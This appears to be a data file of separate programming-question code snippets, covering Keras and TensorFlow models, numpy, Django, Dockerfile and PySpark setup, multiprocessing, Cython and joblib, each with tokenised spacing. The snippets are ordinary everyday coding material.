"import numpy as npimport matplotlib.pyplot as pltdef create_sine ( frequency ) : return np.sin ( frequency*np.linspace ( 0 , 2*np.pi , 2000 ) ) train_x = np.array ( [ create_sine ( x ) for x in range ( 1 , 300 ) ] ) train_y = list ( range ( 1 , 300 ) ) from keras.models import Modelfrom keras.layers import Dense , Input , LSTMinput_series = Input ( shape= ( 2000 , ) , name='Input ' ) dense_1 = Dense ( 100 ) ( input_series ) pred = Dense ( 1 , activation='relu ' ) ( dense_1 ) model = Model ( input_series , pred ) model.compile ( 'adam ' , 'mean_absolute_error ' ) model.fit ( train_x [ :100 ] , train_y [ :100 ] , epochs=100 ) input_series = Input ( shape= ( 2000,1 ) , name='Input ' ) lstm = LSTM ( 100 ) ( input_series ) pred = Dense ( 1 , activation='relu ' ) ( lstm ) model = Model ( input_series , pred ) model.compile ( 'adam ' , 'mean_absolute_error ' ) model.fit ( train_x [ :100 ] .reshape ( 100 , 2000 , 1 ) , train_y [ :100 ] , epochs=100 )"
"a= [ [ 34.45 14.13 2.17 ] [ 32.38 24.43 23.12 ] [ 33.19 3.28 39.02 ] [ 36.34 27.17 31.61 ] [ 37.81 29.17 29.94 ] ] import numpy as np from scipy.spatial import distance d=0.1 # or some distance i=0 selected_points= [ ] while i < len ( a ) : interdist= [ ] j=i+1 while j < len ( a ) : interdist.append ( distance.euclidean ( a [ i ] , a [ j ] ) ) j+=1 if all ( dis > = d for dis in interdist ) : np.array ( selected_points.append ( a [ i ] ) ) i+=1"
"ITEM_STATUSES = ( ( 'pending ' , _ ( 'Waiting approval ' ) ) , ( 'approved ' , _ ( 'Approved ' ) ) , ( 'declined ' , _ ( 'Declined ' ) ) ) class Item ( models.Model ) : title = models.CharField ( max_length=64 ) description = models.TextField ( blank=True ) ... status = models.CharField ( max_length=32 , choices=ITEM_STATUSES ) ... class ItemAdmin ( admin.ModelAdmin ) : passadmin.site.register ( Item , ItemAdmin ) class ItemAdminPending ( admin.ModelAdmin ) : def queryset ( self , request ) : qs = super ( ItemAdminPending , self ) .queryset ( request ) return qs.filter ( status='pending ' ) admin.site.register ( Item , ItemAdminPending )"
"require ( [ 'notebook/js/codecell ' ] , function ( codecell ) { codecell.CodeCell.options_default.highlight_modes [ 'magic_text/x-mssql ' ] = { 'reg ' : [ /^ % % sql/ ] } ; Jupyter.notebook.events.one ( 'kernel_ready.Kernel ' , function ( ) { Jupyter.notebook.get_cells ( ) .map ( function ( cell ) { if ( cell.cell_type == 'code ' ) { cell.auto_highlight ( ) ; } } ) ; } ) ; } ) ; % sql select * from Products limit 5 ; # # % % sqlq = `` select * from customer limit 2 ; '' execute_query ( q , dbname )"
"DATABASES = { 'default ' : { 'ENGINE ' : 'django.db.backends.sqlite3 ' , 'NAME ' : os.path.join ( PROJECT_ROOT , 'mydatabase.db ' ) , } } < ? xml version= '' 1.0 '' ? > < configuration > < appSettings > < add key= '' WSGI_ALT_VIRTUALENV_HANDLER '' value= '' django.core.wsgi.get_wsgi_application ( ) '' / > < add key= '' WSGI_ALT_VIRTUALENV_ACTIVATE_THIS '' value= '' D : \home\site\wwwroot\env\Scripts\activate_this.py '' / > < add key= '' WSGI_HANDLER '' value= '' ptvs_virtualenv_proxy.get_virtualenv_handler ( ) '' / > < add key= '' PYTHONPATH '' value= '' D : \home\site\wwwroot '' / > < add key= '' DJANGO_SETTINGS_MODULE '' value= '' myapp.settings '' / > < /appSettings > < system.web > < compilation debug= '' true '' targetFramework= '' 4.0 '' / > < ! -- Required for websockets . -- > < httpRuntime targetFramework= '' 4.5 '' / > < /system.web > < system.webServer > < modules runAllManagedModulesForAllRequests= '' true '' / > < handlers > < remove name= '' Python273_via_FastCGI '' / > < add name= '' Python FastCGI '' path= '' handler.fcgi '' verb= '' * '' modules= '' FastCgiModule '' scriptProcessor= '' D : \Python27\python.exe|D : \Python27\Scripts\wfastcgi.py '' resourceType= '' Unspecified '' requireAccess= '' Script '' / > < /handlers > < rewrite > < rules > < rule name= '' Static Files '' stopProcessing= '' true '' > < conditions > < add input= '' true '' pattern= '' false '' / > < /conditions > < /rule > < rule name= '' Configure Python '' stopProcessing= '' true '' > < match url= '' ( . * ) '' ignoreCase= '' false '' / > < conditions > < add input= '' { REQUEST_URI } '' pattern= '' ^/static/ . * '' ignoreCase= '' true '' negate= '' true '' / > < /conditions > < action type= '' Rewrite '' url= '' handler.fcgi/ { R:1 } '' appendQueryString= '' true '' / > < /rule > < /rules > < /rewrite > < /system.webServer > < /configuration > SQL time ~217msTotal CPU time ~681msResource ValueUser CPU time 662.771 msecSystem CPU time 18.415 msecTotal CPU time 681.186 msecElapsed time 681.326 msecContext switches 1 voluntary , 95 involuntary SQL time ~854msTotal CPU time ~2282msNo CPU extended breakdown available ."
sub uniqify ( $ ) { my $ timestamp = shift ; state $ last_ts = -1 ; state $ next_letter = ' A ' ; if ( $ timestamp == $ last_ts ) { $ timestamp .= $ next_letter++ ; } else { $ last_ts = $ timestamp ; $ next_letter = ' A ' ; } return $ timestamp ; }
"FROM docker-dev.artifactory.company.com/centos:7.3.1611 # set proxyENV http_proxy http : //proxyaddr.co.uk:8080ENV HTTPS_PROXY http : //proxyaddr.co.uk:8080ENV https_proxy http : //proxyaddr.co.uk:8080RUN yum install -y epel-releaseRUN yum install -y gccRUN yum install -y krb5-develRUN yum install -y python-develRUN yum install -y krb5-workstationRUN yum install -y python-setuptoolsRUN yum install -y python-pipRUN yum install -y xmlstarletRUN yum install -y wget java-1.8.0-openjdkRUN pip install kerberosRUN pip install numpyRUN pip install pandasRUN pip install coverageRUN pip install tensorflowRUN wget http : //d3kbcqa49mib13.cloudfront.net/spark-1.6.0-bin-hadoop2.6.tgzRUN tar -xvzf spark-1.6.0-bin-hadoop2.6.tgz -C /optRUN ln -s spark-1.6.0-bin-hadoop2.6 /opt/sparkENV VERSION_NUMBER $ ( cat VERSION ) ENV JAVA_HOME /etc/alternatives/jre/ENV SPARK_HOME /opt/sparkENV PYTHONPATH $ SPARK_HOME/python/ : $ PYTHONPATHENV PYTHONPATH $ SPARK_HOME/python/lib/py4j-0.9-src.zip : $ PYTHONPATH $ docker run -d -it sse_spark_build:1.009e8aac622d7500e147a6e6db69f806fe093b0399b98605c5da2ff5e0feca07c $ docker exec -it 09e8aac622d7 pythonPython 2.7.5 ( default , Nov 6 2016 , 00:28:07 ) [ GCC 4.8.5 20150623 ( Red Hat 4.8.5-11 ) ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > from pyspark import SparkContext > > > import os > > > os.environ [ 'PYTHONPATH ' ] '/opt/spark/python/lib/py4j-0.9-src.zip : /opt/spark/python/ : ' > > > bec0b9189066 : python /opt/.pycharm_helpers/pydev/pydevconsole.py 0 0PyDev console : starting.import sys ; print ( 'Python % s on % s ' % ( sys.version , sys.platform ) ) sys.path.extend ( [ '/home/cengadmin/git/dhgitlab/sse/engine/fs/programs/pyspark ' , '/home/cengadmin/git/dhgitlab/sse/engine/fs/programs/pyspark ' ] ) Python 2.7.5 ( default , Nov 6 2016 , 00:28:07 ) [ GCC 4.8.5 20150623 ( Red Hat 4.8.5-11 ) ] on linux2import osos.environ [ 'PYTHONPATH ' ] '/opt/.pycharm_helpers/pydev ' from pyspark import SparkContextTraceback ( most recent call last ) : File `` < input > '' , line 1 , in < module > ImportError : No module named pyspark import syssys.path.append ( '/opt/spark/python/ ' ) sys.path.append ( '/opt/spark/python/lib/py4j-0.9-src.zip ' )"
"a = 20x3 arrayb = 20x3 arrayc = 20x3 array = some_cross_function ( a , b ) where : c [ 0 ] = np.cross ( a [ 0 ] , b [ 0 ] ) c [ 1 ] = np.cross ( a [ 1 ] , b [ 1 ] ) c [ 2 ] = np.cross ( a [ 2 ] , b [ 2 ] ) ... etc ..."
def check_cond ( key ) : return True if key in some_dict else Falsesome_task = [ val for val in vals if check_cond ( val ) ]
"Day = c ( rep ( 1,5 ) , rep ( 2,5 ) , rep ( 3,5 ) ) Hour = rep ( 1:5,3 ) Sunlight = c ( 0,1,2,3,0,1,2,3,2,1,0,0,4,2,1 ) data = cbind ( Day , Hour , Sunlight )"
"import nltkfrom nltk.tokenize import word_tokenizeimport numpy as npimport randomfrom collections import Counterfrom nltk.stem import WordNetLemmatizerlemmatizer = WordNetLemmatizer ( ) def create_lexicon ( pos , neg ) : lexicon = [ ] with open ( pos , ' r ' ) as f : contents = f.readlines ( ) for l in contents [ : len ( contents ) ] : l= l.decode ( 'utf-8 ' ) all_words = word_tokenize ( l ) lexicon += list ( all_words ) f.close ( ) with open ( neg , ' r ' ) as f : contents = f.readlines ( ) for l in contents [ : len ( contents ) ] : l= l.decode ( 'utf-8 ' ) all_words = word_tokenize ( l ) lexicon += list ( all_words ) f.close ( ) lexicon = [ lemmatizer.lemmatize ( i ) for i in lexicon ] w_counts = Counter ( lexicon ) l2 = [ ] for w in w_counts : if 1000 > w_counts [ w ] > 50 : l2.append ( w ) print ( `` Lexicon length create_lexicon : `` , len ( lexicon ) ) return l2def sample_handling ( sample , lexicon , classification ) : featureset = [ ] print ( `` Lexicon length Sample handling : `` , len ( lexicon ) ) with open ( sample , ' r ' ) as f : contents = f.readlines ( ) for l in contents [ : len ( contents ) ] : l= l.decode ( 'utf-8 ' ) current_words = word_tokenize ( l.lower ( ) ) current_words= [ lemmatizer.lemmatize ( i ) for i in current_words ] features = np.zeros ( len ( lexicon ) ) for word in current_words : if word.lower ( ) in lexicon : index_value = lexicon.index ( word.lower ( ) ) features [ index_value ] +=1 features = list ( features ) featureset.append ( [ features , classification ] ) f.close ( ) print ( `` Feature SET -- -- -- '' ) print ( len ( featureset ) ) return featuresetdef create_feature_sets_and_labels ( pos , neg , test_size = 0.1 ) : global m_lexicon m_lexicon = create_lexicon ( pos , neg ) features = [ ] features += sample_handling ( pos , m_lexicon , [ 1,0 ] ) features += sample_handling ( neg , m_lexicon , [ 0,1 ] ) random.shuffle ( features ) features = np.array ( features ) testing_size = int ( test_size * len ( features ) ) train_x = list ( features [ : ,0 ] [ : -testing_size ] ) train_y = list ( features [ : ,1 ] [ : -testing_size ] ) test_x = list ( features [ : ,0 ] [ -testing_size : ] ) test_y = list ( features [ : ,1 ] [ -testing_size : ] ) return train_x , train_y , test_x , test_ydef get_lexicon ( ) : global m_lexicon return m_lexicon from create_sentiment_featuresets import create_feature_sets_and_labelsfrom create_sentiment_featuresets import get_lexiconimport tensorflow as tfimport numpy as np # extras for testingfrom nltk.tokenize import word_tokenize from nltk.stem import WordNetLemmatizerlemmatizer = WordNetLemmatizer ( ) # - end extrastrain_x , train_y , test_x , test_y = create_feature_sets_and_labels ( 'pos.txt ' , 'neg.txt ' ) # pt A -- -- -- -- -- -- -n_nodes_hl1 = 1500n_nodes_hl2 = 1500n_nodes_hl3 = 1500n_classes = 2batch_size = 100hm_epochs = 10x = tf.placeholder ( tf.float32 ) y = tf.placeholder ( tf.float32 ) hidden_1_layer = { 'f_fum ' : n_nodes_hl1 , 'weight ' : tf.Variable ( tf.random_normal ( [ len ( train_x [ 0 ] ) , n_nodes_hl1 ] ) ) , 'bias ' : tf.Variable ( tf.random_normal ( [ n_nodes_hl1 ] ) ) } hidden_2_layer = { 'f_fum ' : n_nodes_hl2 , 'weight ' : tf.Variable ( tf.random_normal ( [ n_nodes_hl1 , n_nodes_hl2 ] ) ) , 'bias ' : tf.Variable ( tf.random_normal ( [ n_nodes_hl2 ] ) ) } hidden_3_layer = { 'f_fum ' : n_nodes_hl3 , 'weight ' : tf.Variable ( tf.random_normal ( [ n_nodes_hl2 , n_nodes_hl3 ] ) ) , 'bias ' : tf.Variable ( tf.random_normal ( [ n_nodes_hl3 ] ) ) } output_layer = { 'f_fum ' : None , 'weight ' : tf.Variable ( tf.random_normal ( [ n_nodes_hl3 , n_classes ] ) ) , 'bias ' : tf.Variable ( tf.random_normal ( [ n_classes ] ) ) } def nueral_network_model ( data ) : l1 = tf.add ( tf.matmul ( data , hidden_1_layer [ 'weight ' ] ) , hidden_1_layer [ 'bias ' ] ) l1 = tf.nn.relu ( l1 ) l2 = tf.add ( tf.matmul ( l1 , hidden_2_layer [ 'weight ' ] ) , hidden_2_layer [ 'bias ' ] ) l2 = tf.nn.relu ( l2 ) l3 = tf.add ( tf.matmul ( l2 , hidden_3_layer [ 'weight ' ] ) , hidden_3_layer [ 'bias ' ] ) l3 = tf.nn.relu ( l3 ) output = tf.matmul ( l3 , output_layer [ 'weight ' ] ) + output_layer [ 'bias ' ] return output # pt B -- -- -- -- -- -- -- def train_neural_network ( x ) : prediction = nueral_network_model ( x ) cost = tf.reduce_mean ( tf.nn.softmax_cross_entropy_with_logits ( logits= prediction , labels= y ) ) optimizer = tf.train.AdamOptimizer ( learning_rate= 0.001 ) .minimize ( cost ) with tf.Session ( ) as sess : sess.run ( tf.global_variables_initializer ( ) ) for epoch in range ( hm_epochs ) : epoch_loss = 0 i = 0 while i < len ( train_x ) : start = i end = i+ batch_size batch_x = np.array ( train_x [ start : end ] ) batch_y = np.array ( train_y [ start : end ] ) _ , c = sess.run ( [ optimizer , cost ] , feed_dict= { x : batch_x , y : batch_y } ) epoch_loss += c i+= batch_size print ( 'Epoch ' , epoch+ 1 , 'completed out of ' , hm_epochs , 'loss : ' , epoch_loss ) correct= tf.equal ( tf.argmax ( prediction , 1 ) , tf.argmax ( y , 1 ) ) accuracy = tf.reduce_mean ( tf.cast ( correct , 'float ' ) ) print ( 'Accuracy : ' , accuracy.eval ( { x : test_x , y : test_y } ) ) # testing -- -- -- -- -- -- -- m_lexicon= get_lexicon ( ) print ( 'Lexicon length : ' , len ( m_lexicon ) ) input_data= `` David likes to go out with Kary '' current_words= word_tokenize ( input_data.lower ( ) ) current_words = [ lemmatizer.lemmatize ( i ) for i in current_words ] features = np.zeros ( len ( m_lexicon ) ) for word in current_words : if word.lower ( ) in m_lexicon : index_value = m_lexicon.index ( word.lower ( ) ) features [ index_value ] +=1 features = np.array ( list ( features ) ) .reshape ( 1 , -1 ) print ( 'features length : ' , len ( features ) ) result = sess.run ( tf.argmax ( prediction.eval ( feed_dict= { x : features } ) , 1 ) ) print ( prediction.eval ( feed_dict= { x : features } ) ) if result [ 0 ] == 0 : print ( 'Positive : ' , input_data ) elif result [ 0 ] == 1 : print ( 'Negative : ' , input_data ) train_neural_network ( x ) import tensorflow as tffrom tensorflow.contrib import rnnfrom create_sentiment_featuresets import create_feature_sets_and_labelsfrom create_sentiment_featuresets import get_lexiconimport numpy as np # extras for testingfrom nltk.tokenize import word_tokenize from nltk.stem import WordNetLemmatizerlemmatizer = WordNetLemmatizer ( ) # - end extrastrain_x , train_y , test_x , test_y = create_feature_sets_and_labels ( 'pos.txt ' , 'neg.txt ' ) n_steps= 100input_vec_size= len ( train_x [ 0 ] ) hm_epochs = 8n_classes = 2batch_size = 128n_hidden = 128x = tf.placeholder ( 'float ' , [ None , input_vec_size , 1 ] ) y = tf.placeholder ( 'float ' ) def recurrent_neural_network ( x ) : layer = { 'weights ' : tf.Variable ( tf.random_normal ( [ n_hidden , n_classes ] ) ) , # hidden_layer , n_classes 'biases ' : tf.Variable ( tf.random_normal ( [ n_classes ] ) ) } h_layer = { 'weights ' : tf.Variable ( tf.random_normal ( [ 1 , n_hidden ] ) ) , # hidden_layer , n_classes 'biases ' : tf.Variable ( tf.random_normal ( [ n_hidden ] , mean = 1.0 ) ) } x = tf.transpose ( x , [ 1,0,2 ] ) x = tf.reshape ( x , [ -1 , 1 ] ) x= tf.nn.relu ( tf.matmul ( x , h_layer [ 'weights ' ] ) + h_layer [ 'biases ' ] ) x = tf.split ( x , input_vec_size , 0 ) lstm_cell = rnn.BasicLSTMCell ( n_hidden , state_is_tuple=True ) outputs , states = rnn.static_rnn ( lstm_cell , x , dtype= tf.float32 ) output = tf.matmul ( outputs [ -1 ] , layer [ 'weights ' ] ) + layer [ 'biases ' ] return outputdef train_neural_network ( x ) : prediction = recurrent_neural_network ( x ) cost = tf.reduce_mean ( tf.nn.softmax_cross_entropy_with_logits ( logits= prediction , labels= y ) ) optimizer = tf.train.AdamOptimizer ( learning_rate= 0.001 ) .minimize ( cost ) with tf.Session ( ) as sess : sess.run ( tf.global_variables_initializer ( ) ) for epoch in range ( hm_epochs ) : epoch_loss = 0 i = 0 while ( i+ batch_size ) < len ( train_x ) : start = i end = i+ batch_size batch_x = np.array ( train_x [ start : end ] ) batch_y = np.array ( train_y [ start : end ] ) batch_x = batch_x.reshape ( batch_size , input_vec_size , 1 ) _ , c = sess.run ( [ optimizer , cost ] , feed_dict= { x : batch_x , y : batch_y } ) epoch_loss += c i+= batch_size print ( ' -- -- -- -- Epoch ' , epoch+ 1 , 'completed out of ' , hm_epochs , 'loss : ' , epoch_loss ) correct= tf.equal ( tf.argmax ( prediction , 1 ) , tf.argmax ( y , 1 ) ) accuracy = tf.reduce_mean ( tf.cast ( correct , 'float ' ) ) print ( 'Accuracy : ' , accuracy.eval ( { x : np.array ( test_x ) .reshape ( -1 , input_vec_size , 1 ) , y : test_y } ) ) # testing -- -- -- -- -- -- -- m_lexicon= get_lexicon ( ) print ( 'Lexicon length : ' , len ( m_lexicon ) ) input_data= `` Mary does not like pizza '' # '' he seems to to be healthy today '' # '' David likes to go out with Kary '' current_words= word_tokenize ( input_data.lower ( ) ) current_words = [ lemmatizer.lemmatize ( i ) for i in current_words ] features = np.zeros ( len ( m_lexicon ) ) for word in current_words : if word.lower ( ) in m_lexicon : index_value = m_lexicon.index ( word.lower ( ) ) features [ index_value ] +=1 features = np.array ( list ( features ) ) .reshape ( -1 , input_vec_size , 1 ) print ( 'features length : ' , len ( features ) ) result = sess.run ( tf.argmax ( prediction.eval ( feed_dict= { x : features } ) , 1 ) ) print ( 'RESULT : ' , result ) print ( prediction.eval ( feed_dict= { x : features } ) ) if result [ 0 ] == 0 : print ( 'Positive : ' , input_data ) elif result [ 0 ] == 1 : print ( 'Negative : ' , input_data ) train_neural_network ( x ) print ( train_x [ 0 ] ) [ 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] print ( train_y [ 0 ] ) [ 0 , 1 ] x = tf.transpose ( x , [ 1,0,2 ] ) x = tf.reshape ( x , [ -1 , 1 ] ) x = tf.split ( x , input_vec_size , 0 ) x = tf.placeholder ( 'float ' , [ None , input_vec_size , 1 ] ) == > TensorShape ( [ Dimension ( None ) , Dimension ( 423 ) , Dimension ( 1 ) ] ) ) x = tf.transpose ( x , [ 1,0,2 ] ) == > TensorShape ( [ Dimension ( 423 ) , Dimension ( None ) , Dimension ( 1 ) ] ) ) x = tf.reshape ( x , [ -1 , 1 ] ) == > TensorShape ( [ Dimension ( None ) , Dimension ( 1 ) ] ) ) x = tf.split ( x , input_vec_size , 0 ) == > ? x = tf.placeholder ( 'float ' , [ None , input_vec_size , 1 ] ) x = tf.reshape ( x , [ -1 , 1 ] ) batch_x = np.array ( train_x [ start : end ] ) == > ( 128 , 423 ) batch_x = batch_x.reshape ( batch_size , input_vec_size , 1 ) == > ( 128 , 423 , 1 ) while ( i+ batch_size ) < len ( train_x ) : while i < len ( train_x ) : Traceback ( most recent call last ) : File `` sentiment_demo_lstm.py '' , line 131 , in < module > train_neural_network ( x ) File `` sentiment_demo_lstm.py '' , line 86 , in train_neural_network batch_x = batch_x.reshape ( batch_size , input_vec_size , 1 ) ValueError : can not reshape array of size 52452 into shape ( 128,423,1 )"
"Popen ( [ 'git ' , 'clone ' , 'https : //my.git.repo/repo.git ' ] , shell=False , stdin=PIPE , stdout=PIPE , stderr=PIPE )"
usr/local/lib/python2.7/dist-packages /usr/lib/python2.7/dist-packages
"class AutoVivification ( dict ) : `` '' '' Implementation of perl 's autovivification feature . '' '' '' def __getitem__ ( self , item ) : try : return dict.__getitem__ ( self , item ) except KeyError : value = self [ item ] = type ( self ) ( ) return value a = AutoVivification ( ) a [ 1 ] [ 2 ] [ 3 ] = 4a [ 1 ] [ 3 ] [ 3 ] = 5a [ 1 ] [ 2 ] [ 'test ' ] = 6print a { 1 : { 2 : { 'test ' : 6 , 3 : 4 } , 3 : { 3 : 5 } } }"
class Thing ( ) : def __init__ ( self ) : self.busy = False def func_1 ( self ) : if self.busy : return None self.busy = True ... self.busy = False def func_2 ( self ) : if self.busy : return None self.busy = True ... self.busy = False ...
"INSTALLED_APPS = [ 'project ' , 'project.app1 ' , 'project.app2 ' , ... ]"
"$ touch emptytar $ tar -tf emptytar tar : This does not look like a tar archivetar : Exiting with failure status due to previous errors $ tar -- versiontar ( GNU tar ) 1.22Copyright ( C ) 2009 Free Software Foundation , Inc.License GPLv3+ : GNU GPL version 3 or later < http : //gnu.org/licenses/gpl.html > .This is free software : you are free to change and redistribute it.There is NO WARRANTY , to the extent permitted by law.Written by John Gilmore and Jay Fenlason . $ touch tartest $ cat tartest $ python -c `` import tarfile ; print tarfile.is_tarfile ( 'tartest ' ) '' True $ echo `` not a tar '' > tartest $ python -c `` import tarfile ; print tarfile.is_tarfile ( 'tartest ' ) '' False"
"u_set = UniversalSet ( ) u_set & { 1 , 2 , 3 } == { 1 , 2 , 3 } # ( 1 ) { 1 , 2 , 3 } & u_set == { 1 , 2 , 3 } # ( 2 ) class UniversalSet ( set ) : def __and__ ( self , other ) : return other"
"import osfrom multiprocessing import Processdef run_proc ( name ) : print ( 'child process % s ( % s ) running ... ' % ( name , os.getpid ( ) ) ) if __name__ == '__main__ ' : print ( 'parent process % s . ' % os.getppid ( ) ) for i in range ( 5 ) : p = Process ( target=run_proc , args= ( str ( i ) , ) ) print ( 'process will start'+str ( i ) ) p.start ( ) p.join ( ) print ( 'process is end ' ) parent process 6497. process will start process will start child process 0 ( 6984 ) running ... process will start process will start process will start child process 2 ( 6986 ) running ... child process 1 ( 6985 ) running ... child process 3 ( 6987 ) running ... child process 4 ( 6988 ) running ... process is end parent process 6497. process will start process will start child process 0 ( 6984 ) running ... process will start process will start process will start child process 1 ( 6986 ) running ... child process 2 ( 6985 ) running ... child process 3 ( 6987 ) running ... child process 4 ( 6988 ) running ... process is end parent process 6497.process will startchild process 0 ( 9639 ) running ... process will startchild process 1 ( 9640 ) running ... process will startchild process 2 ( 9641 ) running ... process will startchild process 3 ( 9643 ) running ... process will startchild process 4 ( 9644 ) running ... process is end import osfrom multiprocessing import Processdef run_proc ( name ) : print ( 'child process % s ( % s ) running ... ' % ( name , os.getpid ( ) ) ) if __name__ == '__main__ ' : print ( 'parent process % s . ' % os.getppid ( ) ) for i in range ( 5 ) : p = Process ( target=run_proc , args= ( str ( i ) , ) ) print ( 'process will start'+str ( i ) ) p.start ( ) p.join ( ) print ( 'process is end ' ) parent process 6497. process will start process will start child process 0 ( 6984 ) running ... process will start process will start process will start child process 2 ( 6986 ) running ... child process 1 ( 6985 ) running ... child process 3 ( 6987 ) running ... child process 4 ( 6988 ) running ... process is end parent process 6497. process will start process will start child process 0 ( 6984 ) running ... process will start process will start process will start child process 1 ( 6986 ) running ... child process 2 ( 6985 ) running ... child process 3 ( 6987 ) running ... child process 4 ( 6988 ) running ... process is end"
"cdef class Bin : cdef int* job_ids cdef int* jobs cdef int primitive_data def __cinit__ ( self ) : self.job_ids = < int* > malloc ( 40 * sizeof ( int ) ) self.jobs = < int* > malloc ( 40 * sizeof ( int ) ) def __init__ ( self , int val ) : self.primitive_data = val def __dealloc__ ( self ) : free ( job_ids ) free ( jobs ) def __reduce__ ( self ) : return ( self.__class__ , ( self.primitive_data ) )"
"response = client.get ( `` / '' ) print ( response.headers [ 'Set-Cookie ' ] ) 'mycookie=value ; Expires=Thu , 27-Jun-2019 13:42:19 GMT ; Max-Age=1800 ; Path=/'for item in response.headers : print ( item ) ( 'Content-Type ' , 'application/javascript ' ) ( 'Content-Length ' , '215 ' ) ( 'Set-Cookie ' , 'mycookie=value ; Expires=Thu , 27-Jun-2019 13:42:19 GMT ; Max-Age=1800 ; Path=/ ' ) ( 'Set-Cookie ' , 'mycookie2=another ; Domain=.client.com ; Expires=Sun , 04-Apr-2021 13:42:19 GMT ; Max-Age=62208000 ; Path=/ ' ) ( 'Set-Cookie ' , 'mycookie3=something ; Domain=.client.com ; Expires=Thu , 04-Apr-2019 14:12:19 GMT ; Max-Age=1800 ; Path=/ ' )"
"> > > a= { ' x':42 , ' y':3.14 , ' z':7 } > > > b=a.__iter__ ( ) > > > b.__dir__ ( ) [ '__next__ ' , ... , '__iter__ ' , ... ] > > > b < set_iterator object at 0x7efdd4e5afc0 >"
"from sklearn.externals import joblibfrom sklearn.preprocessing import FunctionTransformerfrom sklearn.pipeline import Pipeline def f ( x ) : return x*2pipe = Pipeline ( [ ( `` times_2 '' , FunctionTransformer ( f ) ) ] ) joblib.dump ( pipe , `` pipe.joblib '' ) del pipedel fpipe = joblib.load ( `` pipe.joblib '' ) # Causes an exception"
